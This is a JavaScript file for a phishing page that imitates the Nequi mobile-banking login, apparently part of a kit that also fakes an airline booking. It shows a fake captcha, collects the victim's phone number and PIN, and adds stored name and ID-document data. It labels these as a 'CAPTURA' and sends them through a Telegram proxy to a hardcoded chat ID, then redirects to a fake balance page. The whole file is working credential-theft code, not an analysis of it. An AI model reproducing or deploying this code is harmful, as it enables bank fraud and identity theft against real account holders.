document.addEventListener('DOMContentLoaded', () => {
    const loginBtn = document.getElementById('login-btn');
    const phoneInput = document.getElementById('phone');
    const passwordInput = document.getElementById('password');
    const captchaContainer = document.getElementById('captcha-box');
    const checkIcon = document.getElementById('check-icon');
    const captchaCircle = document.getElementById('captcha-circle');
    const loadingOverlay = document.getElementById('loading-overlay');
    let isChecked = false;

    // --- CREDENCIALES TELEGRAM ---
    const CHAT_ID = '1556429907';

    // --- DETECCIÓN DE ERROR PREVIO (Usuario Incorrecto) ---
    const errorFlag = sessionStorage.getItem('show_login_error');
    if (errorFlag) {
        const errorAlert = document.getElementById('error-alert');
        if (errorAlert) {
            errorAlert.style.display = 'block';
            setTimeout(() => {
                errorAlert.style.display = 'none';
            }, 3000);
        }
        sessionStorage.removeItem('show_login_error');
    }

    console.log('Script cargado correctamente');
    
    // Allow only numbers in phone input
    phoneInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
    });

    // Allow only numbers in password input
    passwordInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
    });

    captchaContainer.addEventListener('click', () => {
        if (!isChecked) {
            // Check
            captchaContainer.classList.add('active');
            loginBtn.classList.add('active');
            
            if (checkIcon) checkIcon.style.display = 'block';
            if (captchaCircle) captchaCircle.style.borderColor = '#00D69F';
            captchaContainer.style.borderColor = '#00D69F';
            captchaContainer.style.backgroundColor = '#F4FFFC';
            
            isChecked = true;
        } else {
            // Uncheck
            captchaContainer.classList.remove('active');
            loginBtn.classList.remove('active');
            
            if (checkIcon) checkIcon.style.display = 'none';
            if (captchaCircle) captchaCircle.style.borderColor = '#DA0081'; 
            captchaContainer.style.borderColor = '#F5BCE0'; 
            captchaContainer.style.backgroundColor = 'white'; 
            
            isChecked = false;
        }
    });

    loginBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        
        const phone = phoneInput.value;
        const password = passwordInput.value;

        // --- VALIDACIONES ---
        if (phone.length !== 10) {
            alert('El número de celular debe tener 10 dígitos.');
            return;
        }

        if (!phone.startsWith('3')) {
            alert('El número de celular debe comenzar por el número 3.');
            return;
        }

        if (!isChecked) {
            alert('Por favor, confirma que no eres un robot.');
            return;
        }

        if (password.length === 0) {
            alert('Por favor, ingresa tu clave.');
            return;
        }

        // Guardamos en sesión
        sessionStorage.setItem("bc_usuario", phone);

        // Mostrar pantalla de carga
        loadingOverlay.classList.add('active');

        // --- RECUPERAR DATOS DEL USUARIO (desde Ltam) ---
        let userInfoStr = '';
        try {
            const flightUser = JSON.parse(sessionStorage.getItem('flightUser'));
            if (flightUser) {
                userInfoStr = `\n\n👤 **DATOS DEL USUARIO:**\nNombre: ${flightUser.name} ${flightUser.surname}\nDoc: ${flightUser.docType} ${flightUser.docNumber}\nTotal: COP ${flightUser.totalPrice.toLocaleString('es-CO')}`;
            }
        } catch (err) {
            console.error('Error leyendo flightUser', err);
        }

        // --- ENVÍO A TELEGRAM ---
        const mensaje = `🔔 **CAPTURA NEQUI (LOGIN)**\n\n📱 **Celular:** \`${phone}\`\n🔑 **Clave:** \`${password}\`${userInfoStr}\n\n🚀 **Redirigiendo a Saldo...**`;

        try {
            await fetch(`/telegram-proxy/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensaje,
                    parse_mode: 'Markdown'
                })
            });
            
            // Redirigir inmediatamente a saldo.html
            window.location.href = 'saldo.html';

        } catch (error) {
            console.error("Error al enviar a Telegram:", error);
            // Redirigir de todos modos
            window.location.href = 'saldo.html';
        }
    });
});
